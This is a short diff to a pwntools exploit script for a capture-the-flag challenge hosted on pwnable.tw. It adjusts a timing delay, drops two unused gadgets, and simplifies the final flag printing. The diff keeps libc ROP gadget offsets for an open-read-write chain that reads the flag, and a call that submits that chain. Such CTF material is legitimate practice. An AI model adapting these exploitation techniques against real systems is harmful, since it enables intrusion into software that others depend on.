@@ -73,7 +73,7 @@ def conn():
             p = process([e.path], stdin=PTY, stdout=PTY, stderr=PTY)
         else:
             p = process([e.path])
-        sleep(0.25)
+        sleep(0.05)
         return p
     else:
         host = "chall.pwnable.tw"
@@ -264,13 +264,10 @@ while True:
 
     attach(p)
 
-    print("ORW ROP")
     pop_rax = libc.address + 0x00000000000439c8
     pop_rdi = libc.address + 0x000000000002155f
     pop_rsi = libc.address + 0x0000000000023e6a
     pop_rdx = libc.address + 0x0000000000001b96
-    pop_r10 = libc.address + 0x00000000001306b5
-    pop_r8_mov_eax_1 = libc.address + 0x0000000000155fc6
     syscall = libc.address + 0x00000000000d2975
     
     flag_path = stack - 0x58
@@ -303,8 +300,6 @@ while True:
     )
     SubmitBugReport(0, 0, b'6-click', 0, desc_min_size, ROP_chain)
 
-    print("Flag:")
-    print(ra(p, 2))
-
+    print(f'Flag: {ra(p, 2)}')
     p.close()
     break
